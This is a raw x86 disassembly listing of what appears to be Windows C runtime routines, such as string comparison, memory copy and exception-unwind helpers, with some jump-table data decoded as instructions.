  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
